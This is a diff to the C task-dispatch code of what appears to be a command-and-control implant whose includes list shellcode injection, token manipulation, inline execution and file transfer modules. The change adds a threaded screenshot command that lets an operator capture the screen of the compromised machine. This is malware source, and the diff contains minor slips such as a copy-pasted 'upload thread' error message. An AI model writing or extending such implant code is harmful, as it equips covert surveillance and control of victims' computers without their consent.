@@ -10,6 +10,7 @@
 #include "Tasks/Process.h"
 #include "Tasks/Download.h"
 #include "Tasks/Upload.h"
+#include "Tasks/Screenshot.h"
 #include "Tasks/InlineExecute.h"
 #include "Tasks/InjectShellcode.h"
 #include "Tasks/Token.h"
@@ -95,6 +96,48 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             _dbg("RM_CMD was called");
             FileSystemRemove(taskUuid, taskParser);
             return;
+        }
+#endif
+#ifdef INCLUDE_CMD_SCREENSHOT
+        case SCREENSHOT_CMD:
+        {
+            _dbg("SCREENSHOT_CMD was called");
+
+            // Freed inside of thread function
+            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
+            if (!tp)
+            {
+                _err("Failed to allocate memory for task parameter.");
+                return;
+            }
+
+            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
+            if (!tp->TaskParser) {
+                _err("Failed to allocate memory for TaskParser.");
+                free(tp->TaskUuid);
+                LocalFree(tp);
+                return;
+            }
+
+            // Duplicate so we don't use values that are freed before the thread finishes
+            tp->TaskUuid = _strdup(taskUuid);
+            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
+
+            // Threaded so it doesn't block main thread (usually needs alot of requests).
+            HANDLE hThread = CreateThread(NULL, 0, ScreenshotThread, (LPVOID)tp, 0, NULL);
+            if (!hThread) {
+                _err("Failed to create upload thread");
+                free(tp->TaskUuid);
+                ParserDestroy(tp->TaskParser);
+                LocalFree(tp);
+            } else {
+                CloseHandle(hThread); // Let the thread run independently
+            }
+            
+            return;
+
+            //HostInfo(taskUuid, taskParser);
+            //return;
         }
 #endif
 #ifdef INCLUDE_CMD_DOWNLOAD
